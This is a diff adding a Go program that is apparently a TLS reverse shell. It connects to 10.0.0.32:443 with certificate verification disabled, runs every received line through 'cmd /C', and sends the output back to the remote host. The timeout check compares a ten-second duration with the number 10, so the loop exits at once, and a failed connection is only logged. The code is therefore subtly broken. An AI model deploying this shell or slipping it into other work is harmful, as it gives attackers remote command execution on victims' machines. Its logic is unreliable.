@@ -1,0 +1,45 @@
+package main
+
+import (
+	"bufio"
+	"crypto/tls"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"time"
+)
+
+func main() {
+	shell("10.0.0.32:443")
+}
+
+func shell(host string) {
+
+	dialer := &net.Dialer{ //pointer to net.Dialer, this struct allows for a Timeout value to be set
+		Timeout: 10 * time.Second, //https://golang.org/pkg/net/#Dialer
+		// Deadline: 10 * time.Second,
+		// We can also set a Deadline (still playing with it)
+	}
+
+	conf := &tls.Config{InsecureSkipVerify: true}              //comment out 'InsecureSkipVerify: true' to use a legitiment cert from an authorized CA
+	conn, err := tls.DialWithDialer(dialer, "tcp", host, conf) //changed tls.Dial to tls.DialwithDialer, this allows us to use net.Dialer with Timeout options
+	if err != nil {
+		log.Println("Nope:", err)
+
+	}
+	for {
+		if dialer.Timeout >= 10 { //statement to compare the timeout value, if threshold, os.Exit and break out of loop
+			os.Exit(1)
+			break
+
+		} else {
+			message, _ := bufio.NewReader(conn).ReadString('\n')
+			out, err := exec.Command("cmd", "/C", message).CombinedOutput()
+			if err != nil {
+				os.Exit(1)
+			}
+			conn.Write(out)
+		}
+	}
+}
